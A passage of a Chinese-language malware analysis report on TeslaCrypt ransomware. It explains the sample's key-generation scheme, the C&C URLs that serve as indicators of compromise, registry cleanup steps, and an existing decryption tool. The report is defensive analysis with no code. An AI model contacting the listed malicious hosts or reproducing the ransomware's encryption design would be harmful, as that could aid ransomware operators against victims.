src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1567996729356.png" alt="1567996729356"></p><h2 id="加密机制分析"><a href="#加密机制分析" class="headerlink" title="加密机制分析"></a>加密机制分析</h2><blockquote><p>该勒索病毒虽然提示加密文件是通过非对称RSA-2048算法进行加密的，但经过分析该勒索病毒样本实际上是通过对称AES算法来进行加密的</p></blockquote><h3 id="加密算法："><a href="#加密算法：" class="headerlink" title="加密算法："></a>加密算法：</h3><p>通过查看字符串，发现<font color=red>secp256K1</font>椭圆曲线加密算法（ECC）</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083043964.png" alt="1568083043964"></p><p>Secp256K1加密算法，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083196137.png" alt="1568083196137"></p><p><font color=red>RIPEMD160 算法</font>计算比特币钱包地址，如图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083527141.png" alt="1568083527141"></p><p><font color=red>SHA-256</font>摘要算法：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568084212935.png" alt="1568084212935"></p><p>通过对文件加密函数进行了16轮的异或加密，判断出该勒索病毒是通过<font colo=red>AES</font>算法进行加密的。</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568083602748.png" alt="1568083602748"></p><h3 id="加密详解·："><a href="#加密详解·：" class="headerlink" title="加密详解·："></a>加密详解·：</h3><p>1.首先，该病毒样本会生成一个32字节的随机数作为私钥，这里称为：master_btc_priv。</p><p>2.然后计算生成的master_btc_priv的sha256的哈希值,生产master_btc__hash_priv。</p><p>3.再通过调用secp256k1函数来生成master_btc__hash_priv对应的公钥master_btc_hash_pub。</p><p>4.然后再求master_btc_priv对应的公钥master_btc_pub。</p><p>5.样本接下来利用AES算法加密master_btc_priv生成master_key_priv。</p><p>6.根据master_key_priv计算出对应的公钥master_key_pub,此公钥会写入加密文件中，这个公钥在执行线程3时会通过C&amp;C通道加密发给攻击者。</p><p>7.然后再每次加密时，该样本会随机生成32字节的随机数，然后通过secp256K1算法生成一个session_ecdh_secret。并用这个session_ecdh_secret作为AES模式加密的密钥加密session_priv。生成session_key_priv。</p><p>8.根据已经生成的session_key_priv计算出对应的公钥session_key_pub，并保存到加密文件中。</p><p>加密算法大致流程图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/%E8%93%9D%E4%BF%A1%E5%9B%BE%E7%89%87_088082d3041080848801.jpg" alt="蓝信图片_088082d3041080848801"></p><p>该样本将各种key都保存在了加密文件的头部，详细信息见下图：</p><p><img src="https://cdn.jsdelivr.net/gh/Azha0/ImgHosting@1.0/ImgFromBlog/01_%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/01_TeslaCrypt%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/1568087161590.png" alt="1568087161590"></p><h1 id="0x02-样本溯源"><a href="#0x02-样本溯源" class="headerlink" title="0x02 样本溯源"></a>0x02 样本溯源</h1><table><thead><tr><th>恶意URL</th></tr></thead><tbody><tr><td>“<a href="http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;">http://strategicdisaster.info/wordpress/wp-content/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://videoaminproduktion.de/plugins/binstr.php&quot;">http://videoaminproduktion.de/plugins/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://clubsaintandre.fr/PostsImages/binstr.php&quot;">http://clubsaintandre.fr/PostsImages/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://affiliateproductes.com/binstr.php&quot;">http://affiliateproductes.com/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://ptgp.pl/tmp/binstr.php&quot;">http://ptgp.pl/tmp/binstr.php&quot;</a></td></tr><tr><td>“<a href="http://minteee.com/PostsImages/binstr.php&quot;">http://minteee.com/PostsImages/binstr.php&quot;</a></td></tr></tbody></table><h1 id="0x03-查杀、防御技术方案"><a href="#0x03-查杀、防御技术方案" class="headerlink" title="0x03 查杀、防御技术方案"></a>0x03 查杀、防御技术方案</h1><h2 id="删除病毒文件"><a href="#删除病毒文件" class="headerlink" title="删除病毒文件"></a>删除病毒文件</h2><ul><li>删除”我的文档”目录下的xxxxx.exe病毒文件</li></ul><h2 id="修复注册表"><a href="#修复注册表" class="headerlink" title="修复注册表"></a>修复注册表</h2><ul><li>删除<font color=red>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</font>自启项列表中，名为+++xxxx的键值。</li><li>删除<font color=red>HKEY_CURRRENT_USER\Software\MSVCC</font> 列表中，名为FIX的键值。</li><li>删除<font color=red>HKEY_CURRRENT_USER\Software&lt;personID&gt;</font>列表中的，data键值。</li></ul><h2 id="恢复加密文件"><a href="#恢复加密文件" class="headerlink" title="恢复加密文件"></a>恢复加密文件</h2><p>通过分析发现，该勒索病毒使用的其实是对称加加密算法AES，而非该勒索所说的非对称RSA-2048加密算法。而如今由于该病毒的作者已经将密钥公布，就可以对加密的文件进行解密。各大厂商都以公布相关的解密工具，可以下载这些工具，恢复被加密的文件。</p><p>卡巴斯基的解密工具下载链接：<a href="https://media.kaspersky.com/utilities/VirusUtilities/EN/RakhniDecryptor.zip">https://media.kaspersky.com/utilities/VirusUtilities/EN/RakhniDecryptor.zip</a></p><h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><blockquote><p>该勒索病毒在勒索时随提示的是利用RSA加密算法，来对文件进行加密的，但经过详细分析后是通过AES来对文件加密的，再没有作者的密钥的情况下，理论上是不可以进行解密的。但目前该病毒样本的作者已经将密钥公布，即可以对该勒索病毒进行解密，各大安全厂商都已经出了相关的解密工具。若被加密，可通过这些厂商的工具进行解密。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 样本分析报告 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 奇兵计划 </tag>
            
            <tag> 样本分析报告 </tag>
            
            <tag> 勒索 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
